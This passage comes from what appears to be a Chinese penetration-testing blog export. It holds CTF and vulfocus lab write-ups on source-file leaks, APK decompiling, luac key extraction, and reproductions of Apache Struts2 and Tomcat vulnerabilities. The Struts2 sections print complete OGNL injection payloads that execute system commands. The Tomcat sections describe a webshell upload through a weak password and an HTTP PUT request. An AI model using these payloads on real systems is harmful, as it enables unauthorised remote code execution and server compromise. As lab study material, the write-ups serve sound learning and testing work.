<h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>常见的网站源码的文件名有：’web’, ‘website’, ‘backup’, ‘back’, ‘www’, ‘wwwroot’, ‘temp’等等。</p>
<p>常见的网站源码备份文件后缀有：’tar’, ‘tar.gz’, ‘zip’, ‘rar’等等。</p>
<h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>只需在网站根目录对可能存在的备份文件名进行遍历爆破。就可以下载到网站源码。</p>
<p><img src="https://qiniu.hzktester.top/tp2020081809.png" alt="image"></p>
<h3 id="bak文件泄露"><a href="#bak文件泄露" class="headerlink" title="bak文件泄露"></a>bak文件泄露</h3><p><img src="https://qiniu.hzktester.top/tp2020081810.png" alt="image"></p>
<h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码~</p>
<h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>访问链接，看到这样：</p>
<p><img src="https://qiniu.hzktester.top/tp2020081811.png" alt="image"></p>
<p>flag在index.php的源码里，同时我们想到这是bak文件，试试访问</p>
<p><img src="https://qiniu.hzktester.top/tp2020081812.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081813.png" alt="image"></p>
<p>用notepad++打开</p>
<p><img src="https://qiniu.hzktester.top/tp2020081814.png" alt="image"></p>
<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p><img src="https://qiniu.hzktester.top/tp2020081815.png" alt="image"></p>
<h4 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
<p>以 index.php 为例：第一次产生的交换文件名为 <strong>.index.php.swp</strong></p>
<p>再次意外退出后，将会产生名为 <strong>.index.php.swo</strong> 的交换文件</p>
<p>第三次产生的交换文件则为 <strong>.index.php.swn</strong></p>
<h4 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h4><p>将缓存文件下载下来，使用vim编辑原有文件，例如下载的 <strong>.index.php.swp</strong>，则说明之前编辑的文件名为<strong>index.php</strong></p>
<p>会提示是否恢复，选择<strong>R</strong>进行恢复即可看到原始内容</p>
<p><img src="https://qiniu.hzktester.top/tp2020081816.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081817.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020081818.png" alt="image"></p>
<h3 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title=".DS_Store文件泄露"></a>.DS_Store文件泄露</h3><p><img src="https://qiniu.hzktester.top/tp2020081819.png" alt="image"></p>
<h4 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h4><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。</p>
<p>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p>
<p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<p>这里需要一个py脚本：<strong>Python-dsstore-master</strong></p>
<h4 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h4><p><img src="https://qiniu.hzktester.top/tp2020081820.png" alt="image"></p>
<p>进入Python-dsstore-master目录</p>
<p>依次输入下图的命令：</p>
<p>生成.DS_Store.ctfhub（名字可以自定义）</p>
<p><img src="https://qiniu.hzktester.top/tp2020081821.png" alt="image"></p>
<p>用Python-dsstore-master目录中的main.py对刚刚生成的文件.DS_Store.ctfhub进行解析。</p>
<p><img src="https://qiniu.hzktester.top/tp2020081822.png" alt="image"></p>
<p>访问我们看到的.txt文件得到flag</p>
<p><img src="https://qiniu.hzktester.top/tp2020081823.png" alt="image"></p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>APP之反编译+目录结构+重新打包+重新签名</title>
    <url>/posts/7c76bf46.html</url>
    <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
<ol>
<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="https://qiniu.hzktester.top/tp2020081604.png" alt="image"></li>
<li>在cmd窗口下进入当前目录</li>
<li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote>
<p>apktool d qipai.apk</p>
</blockquote>
</li>
<li>重新打包，默认输出<strong>qipai.apk</strong>文件为当前目录<blockquote>
<p>apktool b test</p>
</blockquote>
<a id="more"></a>
<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="https://qiniu.hzktester.top/tp2020081605.png" alt="image"></li>
<li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li>
<li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li>
<li><strong>classes.dex</strong>：源码文件</li>
<li><strong>resources.arsc</strong>：包含了已被编译好的资源的二进制格式文件。</li>
<li><strong>res</strong>：资源文件，主要存放图片、菜单、布局文件等</li>
<li><strong>META-INF</strong>：apk的签名信息</li>
</ol>
<h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>luac的解密过程</title>
    <url>/posts/cc2548f2.html</url>
    <content><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p>
<ol>
<li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li>
<li>加密key与程序内部约定某个值。</li>
</ol>
<p>显然，第一种可以破解，可以再程序中找到解密的值。</p>
<a id="more"></a>
<h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p>
<ol>
<li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p>
<p> <img src="https://qiniu.hzktester.top/tp2020081606.png" alt="image"></p>
</li>
<li><p>寻找加密<strong>key</strong></p>
<ul>
<li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li>
<li>将<strong>lib\libgame.so</strong>文件拖入工具中</li>
<li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li>
<li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li>
</ul>
</li>
<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="https://qiniu.hzktester.top/tp2020081607.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>APP反编译-下载源码</title>
    <url>/posts/b5afabd3.html</url>
    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
<li>解压<strong>dex2jar.jar</strong>文件</li>
<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="https://qiniu.hzktester.top/tp2020081601.png" alt="image"></li>
<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
<p>d2j-dex2jar.bat classes.dex</p>
</blockquote>
</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020081602.png" alt="image"></p>
<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="https://qiniu.hzktester.top/tp2020081603.png" alt="image"></li>
<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
</ol>
]]></content>
      <categories>
        <category>APP渗透</category>
      </categories>
      <tags>
        <tag>APP反编译</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-048 CVE-2017-9791复现过程</title>
    <url>/posts/37119a29.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus启动漏洞环境，选择Integration中的Struts 1 Integration<br><img src="https://qiniu.hzktester.top/tp2020081407.png" alt="image"></p>
</li>
<li><p>随意输入内容，使用burp抓取“submit”的数据包</p>
</li>
<li><p>poc利用</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;id&#39;).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020081408.png" alt="image"></p>
<p>或直接使用工具<br><img src="https://qiniu.hzktester.top/tp2020081409.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-029 CVE-2016-0785复现过程</title>
    <url>/posts/33bebcf9.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;parameters: &lt;s:property value&#x3D;&quot;#parameters.msg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>

<p>Struts2会解析value中的值，并当作OGNL表达式进行执行，获取到parameters对象的msg属性。S2-029仍然是依靠OGNL进行远程代码执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.24.1（不包括2.3.20.3）</p>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li>使用vulfoces搭建环境<br><img src="https://qiniu.hzktester.top/tp2020081403.png" alt="image"></li>
<li>POC利用</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020081404.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-052 CVE-2017-9805复现过程</title>
    <url>/posts/1359d177.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081410.png" alt="image"></p>
</li>
<li><p>使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081411.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-053 CVE-2017-12611复现过程</title>
    <url>/posts/b9ffad5e.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081412.png" alt="image"></li>
<li>利用POC</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;%&#123;(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#context.setMemberAccess(#dm)))).(#cmds&#x3D;(&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;id&#39;&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#process&#x3D;#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>burp抓包构造payload<br><img src="https://qiniu.hzktester.top/tp2020081413.png" alt="image"></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-046 CVE-2017-5638复现过程</title>
    <url>/posts/2b1c937.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
<a id="more"></a>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
<li><p>使用vulfocus启动环境<br><img src="https://qiniu.hzktester.top/tp2020081405.png" alt="image"></p>
</li>
<li><p>直接使用工具拿到flag<br><img src="https://qiniu.hzktester.top/tp2020081406.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-019 CVE-2013-4316复现过程</title>
    <url>/posts/984b6053.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li>使用vulfocus启动环境打开url<br><img src="https://qiniu.hzktester.top/tp2020081401.png" alt="image"></li>
<li>直接使用工具获得flag<br><img src="https://qiniu.hzktester.top/tp2020081402.png" alt="image"></li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-059 CVE-2019-0230复现过程</title>
    <url>/posts/a058ddb7.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
<p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架，应用十分广泛。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.0.0 - 2.5.20</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081416.png" alt="image"></p>
</li>
<li><p>POC利用：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25&#123;%23_memberAccess.allowPrivateAccess%3dtrue,%23_memberAccess.allowStaticMethodAccess%3dtrue,%23_memberAccess.excludedClasses%3d%23_memberAccess.acceptProperties,%23_memberAccess.excludedPackageNamePatterns%3d%23_memberAccess.acceptProperties,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23a%3d%40java.lang.Runtime%40getRuntime(),%23s%3dnew+java.util.Scanner(%23a.exec(&#39;ls&#39;).getInputStream()).useDelimiter(&#39;\\\\A&#39;),%23str%3d%23s.hasNext()%3f%23s.next()%3a&#39;&#39;,%23res.print(%23str),%23res.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qiniu.hzktester.top/tp2020081417.png" alt="image"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-057 CVE-2018-11776复现过程</title>
    <url>/posts/e935ed10.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081414.png" alt="image"></p>
</li>
<li><p>poc利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020081415.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>S2-devMode CVE-2016-4438复现过程</title>
    <url>/posts/ec495d19.html</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
<a id="more"></a>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
<li><p>使用vulfocus搭建漏洞环境<br><img src="https://qiniu.hzktester.top/tp2020081418.png" alt="image"></p>
</li>
<li><p>直接使用工具获得flag<br><img src="https://qiniu.hzktester.top/tp2020081419.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat-弱口令-getshell复现过程</title>
    <url>/posts/4e833979.html</url>
    <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache+Tomcat 是很常用的网站解决方案，Apache 用于提供 web 服务，而 Tomcat 是 Apache 服务器的扩展，用于运行 jsp 页面和 servlet。Tomcat 有一个管理后台，其用户名和密码在 Tomcat 安装目录下的 conf\tomcat-users.xml 文件中配置，不少管理员为了方便，经常采用弱口令。 Tomcat 支持在后台部署 war 包，可以直接将 webshell 部署到 web 目录下，如果 tomcat 后台管理用户存在弱口令，这很容易被利用上传 webshell。</p>
<h2 id="知识点：什么是war包"><a href="#知识点：什么是war包" class="headerlink" title="知识点：什么是war包"></a>知识点：什么是war包</h2><p>war 包是一种打包格式<br>Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。<br>war 包的结构（是一个web 项目编译后的结果）</p>
<a id="more"></a>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
<li><p>使用vulfocus启动漏洞环境<br> <img src="https://qiniu.hzktester.top/tp2020081201.png" alt="image"></p>
</li>
<li><p>访问漏洞环境，点击“Manager App”<br> <img src="https://qiniu.hzktester.top/tp2020081202.png" alt="image"></p>
</li>
<li><p>弱口令登录，账号tomcat，密码tomcat</p>
<p> <img src="https://qiniu.hzktester.top/tp2020081203.png" alt="image"></p>
</li>
<li><p>把jsp木马解压为zip压缩文件，改后缀名为war</p>
</li>
<li><p>上传war包<br> <img src="https://qiniu.hzktester.top/tp2020081204.png" alt="image"></p>
</li>
<li><p>部署war包之后，war包会在当前路径下解压。<br> <img src="https://qiniu.hzktester.top/tp2020081205.png" alt="image"></p>
</li>
<li><p>访问路径是 /war (war包路径) /XXX.jsp（你的 webshell），拿到flag<br> <img src="https://qiniu.hzktester.top/tp2020081206.png" alt="image"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
    <url>/posts/171b876c.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，文件中的代码被服务器执行。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
<a id="more"></a>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
<li><p>使用vulfocus启动漏洞环境<br> <img src="https://qiniu.hzktester.top/tp2020081101.png" alt="image"></p>
</li>
<li><p>访问页面如下：<br> <img src="https://qiniu.hzktester.top/tp2020081102.png" alt="image"></p>
</li>
<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="https://qiniu.hzktester.top/tp2020081103.png" alt="image"></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko&#x2F;20100101 Firefox&#x2F;76.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 60577</span><br><span class="line"></span><br><span 